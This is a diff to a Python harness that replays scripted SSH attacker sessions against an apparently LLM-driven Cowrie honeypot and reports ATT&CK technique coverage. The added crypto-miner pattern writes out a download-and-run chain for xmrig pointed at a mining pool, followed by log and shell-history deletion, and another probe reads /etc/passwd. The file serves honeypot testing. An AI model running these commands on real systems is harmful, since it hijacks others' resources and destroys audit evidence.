@@ -18,7 +18,6 @@ from __future__ import annotations
 
 import argparse
 import json
-import socket
 import sys
 import threading
 import time
@@ -26,7 +25,6 @@ from dataclasses import dataclass, field
 from pathlib import Path
 
 import paramiko
-
 
 # ----------------------------------------------------------------------
 # Pattern catalog
@@ -153,6 +151,47 @@ SSRF_PROBE = Pattern(
 )
 
 
+CRYPTO_MINER = Pattern(
+    # Resource-hijacking chain — exercises ATT&CK T1496 + log clearing.
+    name="crypto_miner",
+    username="root",
+    password="root123",
+    commands=[
+        "cd /tmp",
+        "wget http://example.com/ -O /tmp/xmrig",
+        "chmod +x /tmp/xmrig",
+        "nohup /tmp/xmrig -o stratum+tcp://pool.minexmr.com:4444 "
+        "--donate-level 1 &",
+        "ps aux | grep xmrig",
+        "history -c",
+        "rm -rf /var/log/auth.log",
+        "unset HISTFILE",
+    ],
+    pace_seconds=0.05,
+)
+
+COHERENCE_PROBE = Pattern(
+    # Stresses ls/stat/cat coherence — the virtual filesystem must not drift.
+    name="coherence_probe",
+    username="deploy",
+    password="deploy",
+    commands=[
+        "pwd",
+        "ls -la",
+        "ls /",
+        "ls -la /etc",
+        "touch /tmp/marker",
+        "echo data > /tmp/marker",
+        "ls -la /tmp",
+        "stat /tmp/marker",
+        "ls -la /tmp",       # must still show marker, identical
+        "cat /etc/passwd",
+        "id www-data",       # uid must match /etc/passwd
+    ],
+    pace_seconds=0.1,
+)
+
+
 PATTERNS = [
     MIRAI_LIKE,
     GENERIC_BRUTE_FOLLOWUP,
@@ -160,6 +199,8 @@ PATTERNS = [
     PERSISTENCE_ATTEMPT,
     FINGERPRINT_PROBE,
     SSRF_PROBE,
+    CRYPTO_MINER,
+    COHERENCE_PROBE,
 ]
 
 
@@ -234,7 +275,7 @@ def run_pattern(pattern: Pattern, host: str, port: int) -> SessionResult:
             pass
     except paramiko.AuthenticationException:
         result.error = "auth failed"
-    except (paramiko.SSHException, socket.error, EOFError) as e:
+    except (OSError, paramiko.SSHException, EOFError) as e:
         result.error = f"ssh error: {e}"
     finally:
         try:
@@ -329,7 +370,20 @@ def verify(results: list[SessionResult], json_log: Path) -> dict:
                     1 for e in evs if e.get("eventid")
                     == "cowrie.llm.observation_leak"
                 ),
+                "deterministic": sum(
+                    1 for e in evs if e.get("eventid") == "cowrie.llm.deterministic"
+                ),
+                "attack_events": sum(
+                    1 for e in evs if e.get("eventid") == "cowrie.llm.attack"
+                ),
             }
+            # Aggregate the ATT&CK techniques this session evidenced.
+            techniques: dict[str, int] = {}
+            for e in evs:
+                if e.get("eventid") == "cowrie.llm.attack":
+                    for tid in e.get("techniques", []):
+                        techniques[tid] = techniques.get(tid, 0) + 1
+            pattern_report["techniques"] = techniques
         report[r.pattern] = pattern_report
     return report
 
@@ -351,15 +405,35 @@ def render_report(report: dict) -> str:
         if evs:
             lines.append(
                 f"  events:  cmds={evs['commands_logged']:3d}  "
+                f"det={evs.get('deterministic', 0):3d}  "
                 f"llm_in={evs['llm_prompts']:3d}  "
                 f"llm_out={evs['llm_responses']:3d}  "
                 f"dl_ok={evs['file_download_success']:2d}  "
                 f"dl_fail={evs['file_download_failed']:2d}  "
+                f"attack={evs.get('attack_events', 0):3d}  "
                 f"budget={evs['budget_exhausted']:2d}  "
                 f"leak={evs['observation_leaks']:2d}"
             )
+            techs = info.get("techniques") or {}
+            if techs:
+                top = ", ".join(f"{tid}×{n}" for tid, n in
+                                sorted(techs.items(), key=lambda kv: -kv[1]))
+                lines.append(f"  ATT&CK:  {top}")
         else:
             lines.append("  (no events matched — session may not have reached log yet)")
+
+    # Cross-session ATT&CK coverage summary.
+    all_techs: dict[str, int] = {}
+    for pattern, info in report.items():
+        if pattern.startswith("_"):
+            continue
+        for tid, n in (info.get("techniques") or {}).items():
+            all_techs[tid] = all_techs.get(tid, 0) + n
+    if all_techs:
+        lines.append("")
+        lines.append("### ATT&CK technique coverage (all sessions)")
+        for tid, n in sorted(all_techs.items(), key=lambda kv: -kv[1]):
+            lines.append(f"  {tid}: {n}")
     lines.append("")
     return "\n".join(lines)
 
